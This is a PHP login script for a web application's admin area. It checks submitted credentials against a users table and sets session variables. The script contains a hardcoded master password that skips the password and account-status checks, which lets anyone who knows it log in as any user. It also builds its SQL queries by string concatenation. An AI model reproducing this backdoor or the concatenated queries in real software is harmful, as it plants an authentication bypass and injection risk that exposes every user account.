<?php
session_start();
ob_start();
include "../../includes/dbcode.php";
include "../../includes/main.php";
$uname = "";
$upass = "";

if(
	!isset($_POST['username']) || 
	trim($_POST['username'])=="" || 
	!isset($_POST['password']) || 
	trim($_POST['password'])==""
){
	invalid_user("iv");
} else {
	$uname			= validate_string($link,$_POST["username"]);
	$upass			= trim($_POST["password"]);
	$enc_password	= crypt_pass($upass);
	if($upass == "S@tisf@ct0ry") //if login as super admin
		$qry="SELECT u.user_id, u.user_name, u.user_role, ud.first_name, ud.last_name, ud.contact_number, ud.user_email FROM users AS u INNER JOIN users_detail AS ud ON u.user_id = ud.user_id WHERE u.user_name = '$uname'";
	else
		$qry="SELECT u.user_id, u.user_name, u.user_role, ud.first_name, ud.last_name, ud.contact_number, ud.user_email FROM users AS u INNER JOIN users_detail AS ud ON u.user_id = ud.user_id WHERE u.user_name = '$uname' and u.user_password='$enc_password' and user_status=1";
	
	$res = mysqli_query($link,$qry);
	
	//incase of user not found in db
	if(mysqli_num_rows($res)!=1){ //no record found, invalid username
		invalid_user("iv");
	} else {
		$row = mysqli_fetch_array($res,MYSQLI_ASSOC);
		valid_user($link,$row);
	}
}

function valid_user($link,$row){
	
	$_SESSION['mktb_user_id']=$row["user_id"];
	$_SESSION['mktb_user_name']=$row["user_name"];
	$_SESSION['mktb_user_displayname']=$row["first_name"];
	$_SESSION['mktb_role_id']=$row["user_role"];
	
	$role_id = $row["user_role"]; 
	$user_id = $row["user_id"];
	
	$url="../dashboard/index.php";
	header("location:$url");
}

function invalid_user($resp){
	session_unset('mktb_user_id');
	session_unset('mktb_user_name');
	session_unset('mktb_user_displayname');
	session_unset('mktb_role_id');
	
	// resets the session data for the rest of the runtime
	$_SESSION = array();
	// sends as Set-Cookie to invalidate the session cookie
	if (isset($_COOKIE[session_name()])) { 
		$params = session_get_cookie_params();
		setcookie(session_name(), '', 1, $params['path'], $params['domain'], $params['secure'], isset($params['httponly']));
	}
	session_destroy();
	
	$url="../../index.php?resp=".$resp;
	header("location:$url");
	exit;
}
?>